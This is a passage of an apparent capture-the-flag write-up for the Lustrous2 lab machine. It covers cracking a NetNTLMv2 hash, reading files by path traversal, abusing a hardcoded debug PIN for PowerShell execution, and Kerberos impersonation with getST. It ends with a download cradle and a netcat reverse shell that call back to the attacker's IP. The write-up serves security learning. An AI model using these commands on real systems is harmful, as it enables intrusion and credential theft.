+[SMB] NTLMv2-SSP Hash     : ShareSvc::LUSTROUS2:71fb2c9d9e59ca43:95F26661B93F71027F974D7B54F88675:010100000000000000A7195F96FDDB01EFFC1B7EBCF04456000000000200080056004F004F004F0001001E00570049004E002D003100420032003200360057005900590057005100570004003400570049004E002D00310042003200320036005700590059005700510057002E0056004F004F004F002E004C004F00430041004C000300140056004F004F004F002E004C004F00430041004C000500140056004F004F004F002E004C004F00430041004C000700080000A7195F96FDDB0106000400020000000800300030000000000000000000000000210000DA727D1661722CE2474FF85D61E83727AFE7CEFAA21ECB765E54B20261926CF20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370039000000000000000000
+</span></code></pre></div></div>
+<p>That’s a NetNTLMv2 challenge response (often referred to as a hash).</p>
+<h4 id="crack-password">Crack Password</h4>
+<p>I’ll save that into a file and pass it to <code class="language-plaintext highlighter-rouge">hashcat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat sharesvc.netntlmv2 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+<span class="go">hashcat (v6.2.6) starting in autodetect mode
+...[snip]...
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+5600 | NetNTLMv2 | Network Protocol
+...[snip]...
+SHARESVC::LUSTROUS2:71fb2c9d9e59ca43:95f26661b93f71027f974d7b54f88675:010100000000000000a7195f96fddb01effc1b7ebcf04456000000000200080056004f004f004f0001001e00570049004e002d003100420032003200360057005900590057005100570004003400570049004e002d00310042003200320036005700590059005700510057002e0056004f004f004f002e004c004f00430041004c000300140056004f004f004f002e004c004f00430041004c000500140056004f004f004f002e004c004f00430041004c000700080000a7195f96fddb0106000400020000000800300030000000000000000000000000210000da727d1661722ce2474ff85d61e83727afe7cefaa21ecb765e54b20261926cf20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370039000000000000000000:#1Service
+...[snip]...
+</span></code></pre></div></div>
+<p>On my machine it takes less than 10 seconds to crack as “#1Service”.</p>
+<p>This password works over SMB:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb lus2dc.lustrous2.vl <span class="nt">-u</span> sharesvc <span class="nt">-p</span> <span class="s1">'#1Service'</span> <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        lus2dc.lustrous2.vl 445    lus2dc           </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:lus2dc) (domain:lustrous2.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        lus2dc.lustrous2.vl 445    lus2dc           </span><span class="netexec-logsuccess">[+]</span><span class="go"> lustrous2.vl\sharesvc:#1Service 
+</span></code></pre></div></div>
+<h2 id="shell-as-sharesvc">Shell as ShareSvc</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="collect-web-files">Collect Web Files</h4>
+<p>It seems reasonable that the website will have a <code class="language-plaintext highlighter-rouge">web.config</code> file. It’s not clear what directory the site is running from, but after a couple guesses I find it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>web.config
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>../web.config
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>../../web.config
+<span class="go">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;configuration&gt;
+  &lt;location path="." inheritInChildApplications="false"&gt;
+    &lt;system.webServer&gt;
+      &lt;handlers&gt;
+        &lt;add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" /&gt;
+      &lt;/handlers&gt;
+      &lt;aspNetCore processPath="dotnet" arguments=".\LuShare.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" /&gt;
+    &lt;/system.webServer&gt;
+  &lt;/location&gt;
+&lt;/configuration&gt;
+&lt;!--ProjectGuid: 4E46018E-B73C-4E7B-8DA2-87855F22435A--&gt;
+</span></code></pre></div></div>
+<p>There’s a DotNet <code class="language-plaintext highlighter-rouge">LuShare.dll</code> sitting in the same directory. I’ll download it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl/File/Download?fileName<span class="o">=</span>../../LuShare.dll <span class="nt">--output</span> LuShare.dll
+<span class="go">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 53760  100 53760    0     0   138k      0 --:--:-- --:--:-- --:--:--  138k
+</span></code></pre></div></div>
+<h4 id="reverse-lusharedll">Reverse LuShare.dll</h4>
+<p>I like <a href="https://www.jetbrains.com/decompiler/">DotPeek</a> for DotNet reversing (through <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a> is perfectly good for staying on Linux). I’ll open <code class="language-plaintext highlighter-rouge">LuShare.dll</code> and note right away that the Controllers show more than what I’ve seen in the application so far:</p>
+<picture>
+<source srcset="/img/image-20250725161636175.webp" type="image/webp"/>
+<img alt="image-20250725161636175" class="include_image" loading="lazy" src="/img/image-20250725161636175.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">Index</code> shows the page with the list of files. <code class="language-plaintext highlighter-rouge">Download</code> manages the download:</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="n">IActionResult</span> <span class="nf">Download</span><span class="p">(</span><span class="kt">string</span> <span class="n">fileName</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">fileName</span><span class="p">))</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">NotFound</span><span class="p">();</span>
+      <span class="kt">string</span> <span class="n">path</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_uploadFolder</span><span class="p">,</span> <span class="n">fileName</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(!</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">NotFound</span><span class="p">();</span>
+      <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
+      <span class="k">using</span> <span class="p">(</span><span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileStream</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">,</span> <span class="n">FileShare</span><span class="p">.</span><span class="n">ReadWrite</span><span class="p">))</span>
+        <span class="n">fileStream</span><span class="p">.</span><span class="nf">CopyTo</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span> <span class="n">memoryStream</span><span class="p">);</span>
+      <span class="n">memoryStream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0L</span><span class="p">;</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">File</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span> <span class="n">memoryStream</span><span class="p">,</span> <span class="s">"application/octet-stream"</span><span class="p">,</span> <span class="n">fileName</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>The two <code class="language-plaintext highlighter-rouge">Upload</code> methods (one for GET and the other for POST) handle a form for uploading and the POST request to make the upload:</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">[</span><span class="nf">Authorize</span><span class="p">(</span><span class="n">Roles</span> <span class="p">=</span> <span class="s">"ShareAdmins"</span><span class="p">)]</span>
+    <span class="k">public</span> <span class="n">IActionResult</span> <span class="nf">Upload</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">View</span><span class="p">();</span>
+
+    <span class="p">[</span><span class="n">HttpPost</span><span class="p">]</span>
+    <span class="p">[</span><span class="nf">Authorize</span><span class="p">(</span><span class="n">Roles</span> <span class="p">=</span> <span class="s">"ShareAdmins"</span><span class="p">)]</span>
+    <span class="k">public</span> <span class="k">async</span> <span class="n">Task</span><span class="p">&lt;</span><span class="n">IActionResult</span><span class="p">&gt;</span> <span class="nf">Upload</span><span class="p">(</span><span class="n">IFormFile</span> <span class="n">file</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">FileController</span> <span class="n">fileController</span> <span class="p">=</span> <span class="k">this</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="p">==</span> <span class="k">null</span> <span class="p">||</span> <span class="n">file</span><span class="p">.</span><span class="n">Length</span> <span class="p">&lt;=</span> <span class="m">0L</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="n">fileController</span><span class="p">.</span><span class="nf">View</span><span class="p">();</span>
+      <span class="kt">string</span> <span class="n">fileName</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">FileName</span><span class="p">);</span>
+      <span class="k">using</span> <span class="p">(</span><span class="n">FileStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileStream</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">fileController</span><span class="p">.</span><span class="n">_uploadFolder</span><span class="p">,</span> <span class="n">fileName</span><span class="p">),</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Create</span><span class="p">))</span>
+        <span class="k">await</span> <span class="n">file</span><span class="p">.</span><span class="nf">CopyToAsync</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span> <span class="n">stream</span><span class="p">);</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="n">fileController</span><span class="p">.</span><span class="nf">RedirectToAction</span><span class="p">(</span><span class="s">"Index"</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Both of these are restricted to ShareAdmins, which is probably why I couldn’t see them. It makes sense there’s a functionality to upload files.</p>
+<p>There’s also GET and POST methods for <code class="language-plaintext highlighter-rouge">Debug</code>:</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">[</span><span class="nf">Authorize</span><span class="p">(</span><span class="n">Roles</span> <span class="p">=</span> <span class="s">"ShareAdmins"</span><span class="p">)]</span>
+    <span class="k">public</span> <span class="n">IActionResult</span> <span class="nf">Debug</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">View</span><span class="p">();</span>
+
+    <span class="p">[</span><span class="nf">Authorize</span><span class="p">(</span><span class="n">Roles</span> <span class="p">=</span> <span class="s">"ShareAdmins"</span><span class="p">)]</span>
+    <span class="p">[</span><span class="n">HttpPost</span><span class="p">]</span>
+    <span class="k">public</span> <span class="n">IActionResult</span> <span class="nf">Debug</span><span class="p">(</span><span class="kt">string</span> <span class="n">command</span><span class="p">,</span> <span class="kt">string</span> <span class="n">pin</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">string</span> <span class="n">str</span> <span class="p">=</span> <span class="s">"ba45c518"</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrWhiteSpace</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="p">||</span> <span class="n">command</span><span class="p">.</span><span class="n">Length</span> <span class="p">&gt;</span> <span class="m">100</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">BadRequest</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span> <span class="s">"Invalid or too long command."</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrWhiteSpace</span><span class="p">(</span><span class="n">pin</span><span class="p">))</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(!(</span><span class="n">pin</span> <span class="p">!=</span> <span class="n">str</span><span class="p">))</span>
+        <span class="p">{</span>
+          <span class="k">try</span>
+          <span class="p">{</span>
+            <span class="k">using</span> <span class="p">(</span><span class="n">PowerShell</span> <span class="n">powerShell</span> <span class="p">=</span> <span class="n">PowerShell</span><span class="p">.</span><span class="nf">Create</span><span class="p">())</span>
+            <span class="p">{</span>
+              <span class="n">powerShell</span><span class="p">.</span><span class="n">Runspace</span><span class="p">.</span><span class="n">SessionStateProxy</span><span class="p">.</span><span class="n">LanguageMode</span> <span class="p">=</span> <span class="n">PSLanguageMode</span><span class="p">.</span><span class="n">ConstrainedLanguage</span><span class="p">;</span>
+              <span class="n">powerShell</span><span class="p">.</span><span class="nf">AddScript</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+              <span class="n">Collection</span><span class="p">&lt;</span><span class="n">PSObject</span><span class="p">&gt;</span> <span class="n">collection</span> <span class="p">=</span> <span class="n">powerShell</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">();</span>
+              <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
+              <span class="k">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">psObject</span> <span class="k">in</span> <span class="n">collection</span><span class="p">)</span>
+                <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="n">psObject</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">powerShell</span><span class="p">.</span><span class="n">Streams</span><span class="p">.</span><span class="n">Error</span><span class="p">.</span><span class="n">Count</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
+              <span class="p">{</span>
+                <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="s">"Errors:"</span><span class="p">);</span>
+                <span class="k">foreach</span> <span class="p">(</span><span class="n">ErrorRecord</span> <span class="n">errorRecord</span> <span class="k">in</span> <span class="n">powerShell</span><span class="p">.</span><span class="n">Streams</span><span class="p">.</span><span class="n">Error</span><span class="p">)</span>
+                  <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="n">errorRecord</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
+              <span class="p">}</span>
+              <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">Content</span><span class="p">(</span><span class="n">stringBuilder</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(),</span> <span class="s">"text/plain"</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+          <span class="p">{</span>
+            <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">Content</span><span class="p">(</span><span class="s">"Error running PowerShell command: "</span> <span class="p">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">,</span> <span class="s">"text/plain"</span><span class="p">);</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="k">return</span> <span class="p">(</span><span class="n">IActionResult</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="nf">BadRequest</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span> <span class="s">"Invalid PIN."</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>These are also limited to ShareAdmins. The POST request allows for executing a command with the hardcoded pin, “ba45c518”.</p>
+<h4 id="shareadmins">ShareAdmins</h4>
+<p>The ShareAdmins group is an active directory group, which I can see in BloodHound:</p>
+<picture>
+<source srcset="/img/image-20250725172955076.webp" type="image/webp"/>
+<img alt="image-20250725172955076" class="include_image" loading="lazy" src="/img/image-20250725172955076.png"/>
+</picture>
+<p>There are two members. There’s no obvious outbound control.</p>
+<h3 id="shell">Shell</h3>
+<h4 id="ryandavies-on-web-app">Ryan.Davies on Web App</h4>
+<p>If different users have access to different files, it would make sense for the web application to have some delegation so that it can access other resources as the user on the website. I can try to get a service ticket as another user for the website SPN using <code class="language-plaintext highlighter-rouge">getST</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> ryan.davies <span class="nt">-k</span> <span class="s1">'LUSTROUS2.VL/ShareSvc:#1Service'</span> <span class="nt">-altservice</span> HTTP/lus2dc.lustrous2.vl
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating ryan.davies
+[*] Requesting S4U2self
+[*] Changing service from ShareSvc@LUSTROUS2.VL to HTTP/lus2dc.lustrous2.vl@LUSTROUS2.VL
+[*] Saving ticket in ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
+</span></code></pre></div></div>
+<p>I did have some issues with capitalization here. When I used <code class="language-plaintext highlighter-rouge">lustrous2.vl/ShareSvc:#1Service</code> as the target, it doesn’t work. It has something to do with my <code class="language-plaintext highlighter-rouge">krb5.conf</code> file and how the domain is specified.</p>
+<p>Now I can <code class="language-plaintext highlighter-rouge">curl</code> as Ryan.Davies:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache curl <span class="nt">--negotiate</span> <span class="nt">-u</span> : http://lus2dc.lustrous2.vl <span class="nt">-I</span> 
+<span class="go">HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv63WrcQsFOZdHFNICVTmOVKPlYLeD5fUmATsGXqC+hxVuD/L0fN3km5AatpQ2dKaX0U2DFAYOJsZVGJLnfPDKaarfs1x/Jxzu8FUOYMXLKAEcWD6+09+g/o0bx4Ge8fpwHpCufwU6EyM4FisOiXh0
+Persistent-Auth: true
+X-Powered-By: ASP.NET
+Date: Sat, 26 Jul 2025 14:24:58 GMT
+</span></code></pre></div></div>
+<p>I’ll export this ticket:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache 
+</code></pre></div></div>
+<p>And now Firefox loads as Ryan.Davies as well:</p>
+<picture>
+<source srcset="/img/image-20250727052411324.webp" type="image/webp"/>
+<img alt="image-20250727052411324" class="include_image" loading="lazy" src="/img/image-20250727052411324.png"/>
+</picture>
+<h4 id="debug">Debug</h4>
+<p>There’s an upload link in the nav bar now that loads <code class="language-plaintext highlighter-rouge">/File/Upload</code>:</p>
+<picture>
+<source srcset="/img/image-20250727053028790.webp" type="image/webp"/>
+<img alt="image-20250727053028790" class="include_image" loading="lazy" src="/img/image-20250727053028790.png"/>
+</picture>
+<p>I can give it a file and it shows up in the List:</p>
+<picture>
+<source srcset="/img/image-20250727053044620.webp" type="image/webp"/>
+<img alt="image-20250727053044620" class="include_image" loading="lazy" src="/img/image-20250727053044620.png"/>
+</picture>
+<p>There’s also the Debug endpoint in the dll. I can guess the path for that, or there’s a commented out item in the nav bar:</p>
+<picture>
+<source srcset="/img/image-20250727053143518.webp" type="image/webp"/>
+<img alt="image-20250727053143518" class="include_image" loading="lazy" src="/img/image-20250727053143518.png"/>
+</picture>
+<p>It takes a command and a pin:</p>
+<picture>
+<source srcset="/img/image-20250727053209626.webp" type="image/webp"/>
+<img alt="image-20250727053209626" class="include_image" loading="lazy" src="/img/image-20250727053209626.png"/>
+</picture>
+<p>I have the pin “ba45c518” from the reversing <a href="#reverse-lusharedll">above</a>. I’ll give it <code class="language-plaintext highlighter-rouge">whoami /all</code>, and it generates that output:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20250727053314562.webp" type="image/webp"/>
+<img alt="image-20250727053314562" class="include_image" loading="lazy" src="/img/image-20250727053314562.png" style="max-height: 200px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I’ll try to give the Debug endpoint the PowerShell #3 (Base64) reverse shell from <a href="https://www.revshells.com/">revshells.com</a>, but it returns “Invalid or too long command.”</p>
+<p>I’ll try using a download cradle to fetch PowerShell from a webserver I host and run it with:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.79/shell.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>It returns an error as well:</p>
+<picture>
+<source srcset="/img/image-20250727053905738.webp" type="image/webp"/>
+<img alt="image-20250727053905738" class="include_image" loading="lazy" src="/img/image-20250727053905738.png"/>
+</picture>
+<p>I’ll upload <a href="https://github.com/diegocr/netcat">netcat</a> and then use it to get a shell. I’ll have my webserver hosting <code class="language-plaintext highlighter-rouge">nc64.exe</code>, and give it:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.79/nc64.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">\programdata\nc64.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>It returns nothing, but there is a hit on my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.129.234.174 - - [27/Jul/2025 09:55:58] "GET /nc64.exe HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>Now I’ll give the Debug endpoint:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">\programdata\nc64.exe</span><span class="w"> </span><span class="nx">10.10.14.79</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell</span><span class="w">
+</span></code></pre></div></div>
+<p>On executing, I get a reverse shell:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.174 57529
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+</span><span class="gp">PS C:\inetpub\lushare&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>The user flag is at the root of the C: drive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">user_2e9c1.txt</span><span class="w">
+</span><span class="go">6494ab71bc02f78081f1696bd233866e
+</span></code></pre></div></div>
+<h2 id="shell-as-system">Shell as System</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="filesystem">Filesystem</h4>
+<p>The only interesting user home directory on the box is Administrator:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/31/2024   1:56 AM                .NET v4.5
+d-----         8/31/2024   1:56 AM                .NET v4.5 Classic
+d-----          9/6/2024   5:39 AM                Administrator
+d-r---         8/31/2024   1:03 AM                Public  
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">C:</code> root has a couple non-standard directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         7/26/2025   3:48 AM                datastore
+d-----         4/14/2025   4:50 PM                inetpub
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---         4/14/2025   2:57 AM                Program Files
+d-----          9/6/2024   5:38 AM                Program Files (x86)
+d-----         4/14/2025   4:44 AM                Public
+d-----          9/6/2024   6:57 AM                temp
+d-r---         8/31/2024   1:56 AM                Users
+d-----         6/26/2025   7:12 AM                Windows
+-a----         4/14/2025   4:41 AM             32 user_2e9c1.txt  
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Public</code> is the FTP source. <code class="language-plaintext highlighter-rouge">datastore</code> has an interesting structure that will turn out to be the storage for Velociraptor:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\datastore&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\datastore
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          9/6/2024   8:48 AM                acl
+d-----         7/26/2025   3:48 AM                backups
+d-----          9/6/2024   8:35 AM                clients
+d-----          9/6/2024   8:39 AM                client_info
+d-----          9/6/2024   8:34 AM                config
+d-----         7/25/2025   5:57 AM                logs
+d-----          9/6/2024   8:35 AM                notebooks
+d-----          9/6/2024   8:34 AM                server_artifacts
+d-----          9/6/2024   8:34 AM                server_artifact_logs
+d-----          9/6/2024   8:44 AM                users     
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">Program Files</code>, both the client and the server of Velociraptor are installed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Program Files
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/14/2025   3:05 AM                Amazon
+d-----         8/31/2024   1:03 AM                Common Files
+d-----          9/6/2024   5:39 AM                dotnet
+d-----          9/6/2024   5:38 AM                IIS
+d-----         4/14/2025   4:50 PM                Internet Explorer
+d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
+d-----          9/6/2024   8:35 AM                Velociraptor
+d-----          9/6/2024   8:34 AM                VelociraptorServer
+d-----         4/14/2025   2:57 AM                VMware
+d-----         8/31/2024   1:55 AM                Windows Defender
+d-----         6/26/2025   7:12 AM                Windows Defender Advanced Threat Protection
+d-----         4/14/2025   4:50 PM                Windows Mail
+d-----         4/14/2025   4:50 PM                Windows Media Player
+d-----          5/8/2021   2:35 AM                Windows NT
+d-----         4/14/2025   4:50 PM                Windows Photo Viewer
+d-----          5/8/2021   1:34 AM                WindowsPowerShell  
+</span></code></pre></div></div>
